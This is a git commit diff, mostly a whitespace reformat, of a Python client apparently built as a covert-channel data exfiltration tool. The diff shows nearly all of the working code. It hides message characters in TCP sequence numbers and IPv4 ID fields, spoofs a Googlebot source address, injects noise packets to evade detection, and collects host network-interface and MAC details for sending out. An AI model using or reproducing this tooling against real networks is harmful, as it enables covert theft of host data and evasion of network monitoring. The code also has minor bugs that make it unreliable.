6eaaea4ea6b3aae8d0c38821fc38cc1edfb4398b
Clay Wells <cwells@cwells.org>
2016-11-11 15:21:48 -0500

    some strage formatting thing took place. things seem ok.

--- dissferret-client.py
+++ dissferret-client.py
@@ -70,8 +70,8 @@ message = 'hello from ' + thishost
 exfilArray = []
 
 destination = '127.0.0.1'
-# When using a bounce host, the bounce host will be the destination
-# and the source host will be our server.
+# When using a bounce host, the bounce host will be the destination,
+# the source host will be our server.
 bounce = ''
 # Spoof our source
 spoof = '66.249.66.1'  # Spoof crawl-66-249-66-1.googlebot.com
@@ -89,177 +89,179 @@ interfaces = netifaces.interfaces()
 # Does x fit in a 16bit int?
 # We need this for IPID
 def is_16bit(x):
-	bitl = (x).bit_length()
-	if bitl <= 16:
-		#print '[*] OK: int is 16bit'
-		return True
-	else:
-		#print '[-] Warning: int is too large.'
-		return False
+    bitl = (x).bit_length()
+    if bitl <= 16:
+        # print '[*] OK: int is 16bit'
+        return True
+    else:
+        # print '[-] Warning: int is too large.'
+        return False
 
 
 # Does x fit in a 32bit int?
 # We need this for iseq
 def is_32bit(x):
-	bitl = (x).bit_length()
-	if bitl <= 32:
-		#print '[*] OK: int is 32bit'
-		return True
-	else:
-		#print '[-] Warning: int is too large.'
-		return False
+    bitl = (x).bit_length()
+    if bitl <= 32:
+        # print '[*] OK: int is 32bit'
+        return True
+    else:
+        # print '[-] Warning: int is too large.'
+        return False
 
 
 # Set the ttl=60 to indicate end-of-message
 def send_eom():
-	print '[*] Sending End-Of-Message'
-	pkt.ttl = 60
-	send(pkt)
+    print '[*] Sending End-Of-Message'
+    pkt.ttl = 60
+    send(pkt)
 
 
 # Convert message
 # Lots of options here but we're going to convert each letter of the message
 # to its decimal equivalent.. which will be multiplied by the multiplier.
 def convert_iseq(message):
-	print '[*] converting iseq message: %s' % message
-	for char in message:
-		c = ord(char)
-		# While we are here, might as well generate our SYN packet sequence
-		# number.
-		exfilChar = c * multiplier
-		# Add seq to the global exfilArray.
-		if is_32bit(exfilChar):
-			print '[+] iseq size OK'
-		else:
-			print '[-] Warning: iseq int too large %d. Setting to X' % exfilChar
-			# TODO: recover safely, setting to X for now
-			exfilChar = ord(X) * multiplier
-		exfilArray.append(exfilChar)
-		print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
+    print '[*] converting iseq message: %s' % message
+    for char in message:
+        c = ord(char)
+        # While we are here, might as well generate our SYN packet sequence
+        # number.
+        exfilChar = c * multiplier
+        # Add seq to the global exfilArray.
+        if is_32bit(exfilChar):
+            print '[+] iseq size OK'
+        else:
+            print '[-] Warning: iseq int too large %d. Setting to X' % exfilChar
+            # TODO: recover safely, setting to X for now
+            exfilChar = ord(X) * multiplier
+        exfilArray.append(exfilChar)
+        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
 
 
 def convert_ipid(message):
-	print '[*] converting ipid message: %s' % message
-	for char in message:
-		c = ord(char)
-		# While we are here, might as well generate our SYN packet sequence
-		# number.
-		exfilChar = c * 256
-		# Add to the global exfilArray.
-		if is_16bit(exfilChar):
-			# do nothing (refactor to if not?)
-			print '[+] IPID size OK'
-		else:
-			print '[-] Warning: IPID int too large %d. Setting to X' % exfilChar
-			# TODO: recover safely, setting to X for now
-			exfilChar = ord(X) * 256
-		exfilArray.append(exfilChar)
-		print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
+    print '[*] converting ipid message: %s' % message
+    for char in message:
+        c = ord(char)
+        # While we are here, might as well generate our SYN packet sequence
+        # number.
+        exfilChar = c * 256
+        # Add to the global exfilArray.
+        if is_16bit(exfilChar):
+            # do nothing (refactor to if not?)
+            print '[+] IPID size OK'
+        else:
+            print '[-] Warning: IPID int too large %d. Setting to X' % exfilChar
+            # TODO: recover safely, setting to X for now
+            exfilChar = ord(X) * 256
+        exfilArray.append(exfilChar)
+        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
 
 
 # I think single quotes are killing things
 def trim_message(message):
-	print '[*] trimming message'
-	trimmed = []
-	# Check for a valid char
-	for char in message:
-		# valid = re.match('^[\w-]+$', char) is not None
-		invalid = re.match('^\'', char) is not None
-		print '[*] invalid: %s is %s' % (char, invalid)
-		# Add valid chars to trimmed
-		if invalid == 'True':
-			print '[*] skipping %s' % char
-		else:
-			trimmed.append(char)
-	return trimmed
+    print '[*] trimming message'
+    trimmed = []
+    # Check for a valid char
+    for char in message:
+        # valid = re.match('^[\w-]+$', char) is not None
+        invalid = re.match('^\'', char) is not None
+        print '[*] invalid: %s is %s' % (char, invalid)
+        # Add valid chars to trimmed
+        if invalid == 'True':
+            print '[*] skipping %s' % char
+        else:
+            trimmed.append(char)
+    return trimmed
 
 
 def add_n0ise_iseq(i):
-	print '[*] adding n0ise to iseq..'
-	y = exfilArray[i]
-	# Add some randomness for schlitz n giggles
-	randy = random.randint(-9999999, 9999999)  # too large will produce error
-	pkt.seq = y + randy
-	# Signal noisy packet
-	pkt.window = int(8182) - random.randint(23, 275)
-	pkt.ttl = 128
-	send(pkt)
+    print '[*] adding n0ise to iseq..'
+    y = exfilArray[i]
+    # Add some randomness for schlitz n giggles
+    randy = random.randint(-9999999, 9999999)  # too large will produce error
+    pkt.seq = y + randy
+    # Signal noisy packet
+    pkt.window = int(8182) - random.randint(23, 275)
+    pkt.ttl = 128
+    send(pkt)
 
 
 def add_n0ise_ipid(i):
-	print '[*] adding n0ise to IPID..'
-	y = exfilArray[i]
-	# Add some randomness for schlitz n giggles
-	randy = random.randint(-999, 999)  # too large will produce error
-	pkt.seq = y + randy
-	# Signal noisy packet
-	pkt.window = int(8182) - random.randint(23, 275)
-	pkt.ttl = 128
-	send(pkt)
+    print '[*] adding n0ise to IPID..'
+    y = exfilArray[i]
+    # Add some randomness for schlitz n giggles
+    randy = random.randint(-999, 999)  # too large will produce error
+    pkt.seq = y + randy
+    # Signal noisy packet
+    pkt.window = int(8182) - random.randint(23, 275)
+    pkt.ttl = 128
+    send(pkt)
 
 
 # In IPv4, the Identification (ID) field is a 16-bit value.
 # TODO: validate value of ipid (must be a 16-bit value)
 def exfil_ipid():
-	print '[*] Attempting ID identification exfil..msglen', msglen
-	i = 0
-	for c in exfilArray:
-		print '[*] count i:', i
-		if i == msglen:
-			print '[*] EOM'
-		add_n0ise_ipid(i)
-		pkt.ttl = 68
-		pkt.id = exfilArray[i]
-		time.sleep(0.4)
-		send(pkt)
-		i += 1
-	send_eom()
+    print '[*] Attempting ID identification exfil..msglen', msglen
+    i = 0
+    for c in exfilArray:
+        print '[*] count i:', i
+        if i == msglen:
+            print '[*] EOM'
+        add_n0ise_ipid(i)
+        pkt.ttl = 68
+        pkt.id = exfilArray[i]
+        time.sleep(0.4)
+        send(pkt)
+        i += 1
+    send_eom()
+
 
 # Send message using initial sequence numbers. Add noise.
 def exfil_iseq():
-	i = 0
-	k = 8192  # window size
-	for c in exfilArray:
-		add_n0ise_iseq(i)
-		pkt.window = k
-		pkt.ttl = 64
-		pkt.seq = exfilArray[i]
-		# slow our roll
-		time.sleep(0.4)
-		send(pkt)
-		i += 1
-	send_eom()
+    i = 0
+    k = 8192  # window size
+    for c in exfilArray:
+        add_n0ise_iseq(i)
+        pkt.window = k
+        pkt.ttl = 64
+        pkt.seq = exfilArray[i]
+        # slow our roll
+        time.sleep(0.4)
+        send(pkt)
+        i += 1
+    send_eom()
+
 
 def exfil_bounce():
-	print '[*] Attempting Ack sequence number bounce exfil..'
+    print '[*] Attempting Ack sequence number bounce exfil..'
 
 
 # This function sends interface details for interfaces of interest, AF_INET
 # family. This function currently uses the initial sequence number.
 def send_iface():
-	print '[*] interfaces: %s' % interfaces
-	# Interesting in sending found en*, eth*, and wlp* interface data
-	for face in interfaces:
-		addrs = netifaces.ifaddresses(face)
-		# Get the MAC address
-		facemac = addrs[netifaces.AF_LINK]
-		try:
-			print face, netifaces.ifaddresses(face)[2], facemac
-			# Try to display en*
-			if 'en' in face or 'eth' in face or 'wlp' in face:
-				print '[*] found: %s' % face
-				message = str(netifaces.ifaddresses(face)[2])
-				# debugging
-				print '[*] New message: %s' % message
-				#trimmed = trim_message(message)
-				#print '[*] Trimmed message: %s' % trimmed
-				convert_message(message)
-				# Call the testing method we'd like to test
-				# TODO: run all tests or run a specific test, specify here.
-				exfil_iseq()
-		except:
-			# skip, do nothing
-			print "[-] interface does not contain AF_INET family."
+    print '[*] interfaces: %s' % interfaces
+    # Interesting in sending found en*, eth*, and wlp* interface data
+    for face in interfaces:
+        addrs = netifaces.ifaddresses(face)
+        # Get the MAC address
+        facemac = addrs[netifaces.AF_LINK]
+        try:
+            print face, netifaces.ifaddresses(face)[2], facemac
+            # Try to display en*
+            if 'en' in face or 'eth' in face or 'wlp' in face:
+                print '[*] found: %s' % face
+                message = str(netifaces.ifaddresses(face)[2])
+                # debugging
+                print '[*] New message: %s' % message
+                # trimmed = trim_message(message)
+                # print '[*] Trimmed message: %s' % trimmed
+                convert_message(message)
+                # Call the testing method we'd like to test
+                # TODO: run all tests or run a specific test, specify here.
+                exfil_iseq()
+        except:
+            # skip, do nothing
+            print "[-] interface does not contain AF_INET family."
 
 
 # ============
@@ -285,21 +287,21 @@ exfilArray = []  # clear before each use
 
 # ==== use IPID
 print '[*] Testing method IPID..'
-pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S') # reset our packet
+pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S')  # reset our packet
 convert_ipid(message)
 msglen = len(exfilArray)
 exfil_ipid()
 print '[*] Sent using IPID: %s' % message
 
-#exfilArray = []
+# exfilArray = []
 # ====
 print '[*] Getting ready to send network interface details'
-#print '[*] Resetting message and exfilArray'
+# print '[*] Resetting message and exfilArray'
 #
-#message = ''
-#exfilArray = []
-#pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S') # reset our packet
+# message = ''
+# exfilArray = []
+# pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S') # reset our packet
 #
 # FIXME: something was messing up.. seems to work OK now.. the try/except in
 #        the server code seems to have fixed the issue.
-#send_iface()
+# send_iface()
